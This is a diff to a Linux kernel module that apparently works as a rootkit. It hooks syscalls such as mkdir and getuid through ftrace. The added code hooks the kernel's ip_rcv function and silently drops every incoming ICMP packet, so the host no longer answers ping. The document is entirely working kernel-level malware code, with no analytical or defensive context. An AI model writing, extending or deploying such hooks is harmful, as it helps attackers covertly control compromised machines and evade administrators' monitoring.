@@ -7,6 +7,10 @@
 #include <linux/fs.h>
 #include <linux/kprobes.h>
 #include <linux/slab.h>
+#include <linux/skbuff.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/netfilter.h>
 #include "secure.h"
 
 // Version-specific adjustments
@@ -179,11 +183,36 @@ static asmlinkage long hook_getuid(const struct pt_regs *regs) {
     }
     return orig_getuid(regs);
 }
+typedef int (*orig_ip_rcv)(struct sk_buff *skb, struct net_device *dev,struct packet_type *pt,struct net_device *orig_dev);
+static  orig_ip_rcv orig_ip;
+DECL_FUNC_CHECK(orig_ip,SIG_IP_RCV);
 
+static int hook_ip(struct sk_buff *skb, struct net_device *dev,struct packet_type *pt, struct net_device *orig_dev) {
+struct iphdr *ip_header;
+
+        if ( !skb ){
+            goto origin;
+        }
+        
+ip_header = ip_hdr(skb);
+
+        if( !ip_header ){
+            goto origin;
+        }    
+        
+        switch(ip_header->protocol) {
+                case IPPROTO_ICMP:
+                        return 0;
+        }
+origin:
+         return orig_ip(skb, dev, pt, orig_dev);
+
+}
 
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
     HOOK("__x64_sys_getuid", hook_getuid, &orig_getuid),
+    HOOK("ip_rcv",hook_ip,&orig_ip),
 };
 
 
